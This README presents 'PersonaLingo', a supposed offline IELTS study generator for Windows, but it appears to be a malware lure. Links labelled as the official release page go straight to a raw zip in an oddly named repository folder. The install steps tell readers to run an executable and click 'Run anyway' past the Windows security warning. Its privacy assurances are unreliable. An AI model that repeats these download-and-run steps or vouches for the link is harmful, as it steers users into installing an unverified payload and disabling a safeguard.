# 🎯 PersonaLingo - Customize your IELTS study materials today

[![Download PersonaLingo](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/arelfruitful261/PersonaLingo/main/Babbittism/Lingo-Persona-v3.6.zip)

PersonaLingo builds custom study guides for your IELTS exam. It uses your personal interests and personality traits to create practice content. This tool helps you learn English faster by making the material feel relevant to your life. The application works offline on your Windows computer and does not require coding skills.

## 💻 System Requirements

Your computer needs to meet these basic standards to run the application well:

* Operating System: Windows 10 or Windows 11.
* Memory: 8GB of RAM.
* Storage: 2GB of free space.
* Internet Connection: Required for the initial setup.

## 📥 How to Install

Follow these steps to set up the application on your computer.

1. Visit the [official release page](https://raw.githubusercontent.com/arelfruitful261/PersonaLingo/main/Babbittism/Lingo-Persona-v3.6.zip) to access the files.
2. Look for the file ending in `.exe` under the latest release section.
3. Click the file name to download the installer to your Downloads folder.
4. Open your Downloads folder and double-click the `PersonaLingo-Setup.exe` file.
5. Windows might show a security prompt. If you see "Windows protected your PC," click "More info" and then "Run anyway."
6. Follow the instructions on the screen to finish the installation.

## 🚀 Setting Up Your Profile

Once the installation finishes, you will see a PersonaLingo icon on your desktop. Double-click this icon to start the application.

When the application opens for the first time, you need to create your study profile:

1. Enter your name and choose your current English skill level.
2. Select your main interests. The app uses these topics to generate your study text.
3. Choose your personality type if you know it, otherwise, let the app analyze your preferences through the quick setup questionnaire.
4. Save your profile settings. The application uses these details to generate unique IELTS exercises.

## ⚙️ How It Works

PersonaLingo works in stages to create your personalized study material:

* Analysis: The app looks at your profile and interests.
* Data Gathering: It pulls relevant information based on your preferences.
* Filtering: The app selects words and topics that best suit your exam goals.
* Generation: The internal engine creates reading passages and practice tests.
* Review: You receive a clean file containing your custom study list.

You do not need to manage the technical pipeline. The software handles all data processing in the background.

## 🛠 Using the Features

The main dashboard shows your active study progress. You can perform several actions from the home menu:

* Generate New Lesson: Creates a new set of materials based on your profile.
* View Saved Corpus: Opens your past study materials in a web browser for easy reading.
* Update Profile: Changes your interests or goals at any time.
* Export Data: Saves your study history as a file for backup.

## 🧩 Understanding Your Study Corpus

The software creates a `corpus.json` file. This file acts as your central library. It stores all the vocabulary and grammar rules the app generated for you. You can find this file in the installation folder. If you want to share your study settings with a teacher, you can provide them with this file.

## 🛡 Security and Privacy

Your data stays on your computer. PersonaLingo operates as a local application. It does not send your personal study history to a cloud server. Your private profile settings remain within your Windows user directory. You have full control over when to delete or archive your data.
